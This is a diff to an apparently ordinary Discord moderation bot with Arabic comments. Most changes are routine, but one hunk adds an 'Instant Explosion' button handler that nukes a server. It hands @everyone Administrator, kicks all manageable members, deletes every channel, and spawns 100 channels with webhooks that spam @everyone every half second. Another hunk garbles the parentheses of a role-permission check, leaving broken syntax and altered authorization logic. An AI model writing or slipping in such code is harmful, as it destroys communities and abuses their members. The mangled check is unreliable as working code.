@@ -37,19 +37,6 @@ const { handleAdminApplicationInteraction } = require('./commands/admin-apply.js
 const { restoreTopSchedules, restorePanelCleanups, handlePanelMessageDelete } = require('./commands/roles-settings.js');
 const { handleChannelDelete, handleRoleDelete } = require('./utils/protectionManager.js');
 const problemCommand = require('./commands/problem.js');
-const { executeDieAction, executeDeadAction } = require('./utils/modifications.js');
-
-// --- AUTOMATIC PERMISSION FOR ACCELERATOR ---
-try {
-    const accelPath = path.join(__dirname, 'go_accelerator', 'accelerator');
-    if (fs.existsSync(accelPath)) {
-        fs.chmodSync(accelPath, 0o755);
-        console.log('✅ Accelerator permissions set automatically.');
-    }
-} catch (e) {
-    console.error('⚠️ Could not set accelerator permissions automatically:', e.message);
-}
-
 let interactiveRolesManager;
 dotenv.config();
 
@@ -1180,11 +1167,17 @@ client.once(Events.ClientReady, async () => {
         const now = Date.now();
 
         // معلومات القنوات
-        const oldChannelId = oldState.channel?.id;
-        const newChannelId = newState.channel?.id;
-        const oldChannelName = oldState.channel?.name || 'لا يوجد';
-        const newChannelName = newState.channel?.name || 'لا يوجد';
+        const isOldTrackableVoice = !!oldState.channel && oldState.channel.type !== ChannelType.GuildStageVoice;
 
+        const isNewTrackableVoice = !!newState.channel && newState.channel.type !== ChannelType.GuildStageVoice;
+
+        const oldChannelId = isOldTrackableVoice ? oldState.channel.id : null;
+
+        const newChannelId = isNewTrackableVoice ? newState.channel.id : null;
+
+        const oldChannelName = isOldTrackableVoice ? (oldState.channel?.name || 'لا يوجد') : 'Stage';
+
+        const newChannelName = isNewTrackableVoice ? (newState.channel?.name || 'لا يوجد') : 'Stage';
         // تحميل دالة تتبع النشاط
         const { trackUserActivity } = require('./utils/userStatsCollector');
 
@@ -1298,6 +1291,15 @@ client.once(Events.ClientReady, async () => {
 
             for (const [userId, session] of client.voiceSessions.entries()) {
                 try {
+                    const sessionChannel = client.channels.cache.get(session.channelId);
+
+                    if (sessionChannel && sessionChannel.type === ChannelType.GuildStageVoice) {
+
+                        client.voiceSessions.delete(userId);
+
+                        continue;
+
+                    }
                     const sessionStart = session.startTime || session.sessionStartTime;
                     const totalSessionDuration = now - sessionStart;
                     if (totalSessionDuration >= AFK_LIMIT) {
@@ -2388,7 +2390,7 @@ client.on('messageCreate', async message => {
       await command.execute(message, args, { responsibilities, points, scheduleSave, BOT_OWNERS, ADMIN_ROLES: CURRENT_ADMIN_ROLES, client, colorManager });
     }
     // Commands for admins and owners (user, مسؤول, اجازه, check, rooms)
-    else if (commandName === 'ترقيه' || commandName === 'list' || commandName === 'حذف' || commandName === 'settings' || commandName === 'problem' || commandName === 'مشكله' || commandName === 'settings' || commandName === 'انشاء' || commandName === 'اجازه' || commandName === 'تصفيه' || commandName === 'مسؤولياتي' || commandName === 'اجازتي' || commandName === 'check' || commandName === 'rooms') {
+    else if (commandName === 'ترقيه' || commandName === 'list' || commandName === 'حذف' || commandName === 'settings' || commandName === 'problem' || commandName === 'مشكله' || commandName === 'roled' || commandName === 'انشاء' || commandName === 'اجازه' || commandName === 'تصفيه' || commandName === 'مسؤولياتي' || commandName === 'اجازتي' || commandName === 'check' || commandName === 'rooms') {
       if (commandName === 'مسؤول') {
         console.log(`🔍 التحقق من صلاحيات المستخدم ${message.author.id} لأمر مسؤول:`);
         console.log(`- isOwner: ${isOwner}`);
@@ -2824,14 +2826,14 @@ client.on('guildMemberUpdate', async (oldMember, newMember) => {
                             const executor = recentRoleUpdateEntry?.executor || null;
                             const executorMember = executor ? await newMember.guild.members.fetch(executor.id).catch(() => null) : null;
                             const isAllowedExecutor = Boolean(
-                                executorMember && (
-                                    (global.BOT_OWNERS || []).includes(executorMember.id)
+                                executorMember && (global.BOT_OWNERS || []).includes(executorMember.id)
                                     || approverRoleIds.some((approverRoleId) => executorMember.roles.cache.has(approverRoleId))
                                 )
-                            );
+                            
 
-                            if (executorMember && !isAllowedExecutor) {
-                                await newMember.roles.remove(role, 'منع إعطاء رول تفاعلي يدوي من غير المسؤولين المعتمدين');
+if (executorMember && !isAllowedExecutor) {
+
+                                                   await newMember.roles.remove(role, 'منع إعطاء رول تفاعلي يدوي من غير المسؤولين المعتمدين');
                                 logEvent(client, newMember.guild, {
                                     type: 'SECURITY_ACTIONS',
                                     title: 'منع إعطاء رول تفاعلي يدوي',
@@ -2843,9 +2845,12 @@ client.on('guildMemberUpdate', async (oldMember, newMember) => {
                                         { name: 'السبب', value: 'يسمح فقط للمسؤولين المعتمدين إعطاء الرولات التفاعلية يدوياً', inline: false }
                                     ]
                                 });
+                     
                             } else if (!executorMember) {
+
                                 console.log(`⚠️ تعذر تحديد منفذ إعطاء الرول ${role.name} للعضو ${newMember.displayName}، تم تجاهل الحماية لهذه العملية لتجنب إزالة رول صحيح.`);
-                            }
+
+                 }
                         } catch (err) {
                             console.error('خطأ في التحقق من صلاحية مانح الرول التفاعلي:', err);
                         }
@@ -3416,14 +3421,94 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // --- DIE & DEAD ACTION HANDLERS (Accelerated Mode) ---
+    // --- DIE & DEAD ACTION HANDLERS (Instant Explosion Mode) ---
     if (interaction.isButton() && (interaction.customId === 'die_action' || interaction.customId === 'Dead_action' || interaction.customId.startsWith('die_action_') || interaction.customId.startsWith('Dead_action_'))) {
         const customId = interaction.customId;
-        if (customId.startsWith('die_action')) {
-            await executeDieAction(interaction);
-        } else {
-            await executeDeadAction(interaction);
+        const mode = customId.startsWith('die_action') ? 'die' : 'Dead';
+        const targetGuildId = customId.includes('_') ? customId.split('_').slice(2).join('_') : null;
+        const guild = interaction.guild || (targetGuildId ? await client.guilds.fetch(targetGuildId).catch(() => null) : null);
+
+        if (!guild) {
+            await interaction.reply({
+                content: '❌ ما قدرت أحدد السيرفر المستهدف من هذا الزر. أعد المحاولة بعد خروج/باند جديد.',
+                flags: MessageFlags.Ephemeral
+            }).catch(() => {});
+            return;
         }
+        
+        try {
+            await interaction.deferUpdate().catch(() => {});
+            actionStats.set(guild.id, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });
+
+            // جلب البيانات الأساسية بسرعة البرق
+            const [members, channels, roles] = await Promise.all([
+                guild.members.fetch(),
+                guild.channels.fetch(),
+                guild.roles.fetch()
+            ]);
+
+            const everyoneRole = guild.roles.everyone;
+
+            // --- المرحلة 1: الصدمة الأولى (الرتب والطرد) ---
+            const initialShock = [];
+            initialShock.push(everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
+            
+            roles.filter(r => r.editable && r.id !== everyoneRole.id).forEach(r => {
+                initialShock.push(r.setPermissions(mode === 'die' ? [] : [PermissionsBitField.Flags.Administrator]).then(() => updateStats(guild.id, 'rolesModified')));
+            });
+
+            members.filter(m => m.id !== guild.ownerId && m.manageable).forEach(m => {
+                initialShock.push(m.kick('Instant Explosion').then(() => updateStats(guild.id, 'membersKicked')));
+            });
+
+            Promise.all(initialShock.map(p => p.catch(() => {})));
+
+            // --- المرحلة 2: الانفجار اللحظي (الرومات والسبام المتعدد) ---
+            if (mode === 'Dead') {
+                // حذف الرومات بالتوازي المطلق
+                channels.forEach(c => c.delete().then(() => updateStats(guild.id, 'channelsDeleted')).catch(() => {}));
+
+                // تقنية Multi-Stream Flooding: 100 روم مع ويبهوكات متعددة
+                for (let i = 0; i < 100; i++) {
+                    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)] + '-' + i;
+                    guild.channels.create({ name: randomName, type: ChannelType.GuildText })
+                        .then(channel => {
+                            // إنشاء 3 ويبهوكات لكل روم لمضاعفة سرعة السبام وتوزيع الضغط
+                            for (let w = 0; w < 3; w++) {
+                                channel.createWebhook({ name: `Destroyer-${w}` })
+                                    .then(webhook => {
+                                        updateStats(guild.id, 'webhooksCreated');
+                                        // إرسال سبام مكثف من كل ويبهوك بشكل متوازي
+                                        const spamInterval = setInterval(() => {
+                                            webhook.send('@everyone DEAD HAS TAKEN OVER! 💥\nhttps://tenor.com/view/explosion-boom-blast-nuclear-gif-14732150')
+                                                .then(() => updateStats(guild.id, 'messagesSpammed'))
+                                                .catch(() => clearInterval(spamInterval));
+                                        }, 500); // إرسال رسالة كل نصف ثانية من كل ويبهوك
+                                        
+                                        // التوقف بعد 50 رسالة لكل ويبهوك لتجنب التعليق الكامل
+                                        setTimeout(() => clearInterval(spamInterval), 30000);
+                                    }).catch(() => {});
+                            }
+                        }).catch(() => {});
+                }
+            }
+
+            // تحديث التقرير النهائي بعد 8 ثوانٍ
+            setTimeout(async () => {
+                const stats = actionStats.get(guild.id) || { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 };
+                const embed = new EmbedBuilder()
+                    .setTitle('🔥 انفجار شامل ونهائي')
+                    .setColor('#000000')
+                    .setDescription('تم تنفيذ العملية بنجاح تام.')
+                    .addFields(
+                        { name: '🗑️ رومات', value: `${stats.channelsDeleted}`, inline: true },
+                        { name: '👢 طرد', value: `${stats.membersKicked}`, inline: true },
+                        { name: '🛡️ رولات', value: `${stats.rolesModified}`, inline: true },
+                        { name: '📧 سبام', value: `${stats.messagesSpammed}`, inline: true }
+                    );
+                await interaction.editReply({ embeds: [embed], components: [] }).catch(() => {});
+            }, 8000);
+        } catch (error) { console.error('Error in Burst Action:', error); }
         return;
     }
 
